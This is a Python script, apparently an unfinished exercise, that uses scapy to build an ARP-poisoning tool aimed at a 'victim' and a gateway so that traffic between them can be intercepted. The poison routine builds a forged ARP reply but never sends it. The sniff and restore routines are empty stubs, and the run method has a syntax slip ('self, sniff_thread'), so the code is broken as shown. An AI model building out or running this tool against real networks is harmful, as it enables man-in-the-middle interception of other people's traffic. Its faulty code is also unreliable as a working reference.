#!/usr/bin/python3

from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap
from pprint import pprint
import subprocess
import sys
import os
from multiprocessing import Process
from typing import Any


def check_network() -> Any:
    output = subprocess.check_output(["ifconfig"], stderr=subprocess.STDOUT, shell=True)
    return output.decode().replace("\n", "")


def get_mac(targetip):

    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)

    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface="eth0") -> None:
        self.victim = victim
        self.victim_mac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gateway_mac}.')
        print(f'Victim ({victim}) is at {self.victim_mac}.')
        print('-' * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self, sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victim_mac

        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-' * 30)

    def sniff(self, count=200):
        pass

    def restore(self):
        pass


def main():

    # represent a tuple with the information
    # in the network settings
    # check_network()

    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])

    for x in sys.argv:
        print(x)

    myarp = Arper(victim, gateway, interface)
    myarp.run()


if __name__ == "__main__":
    main()
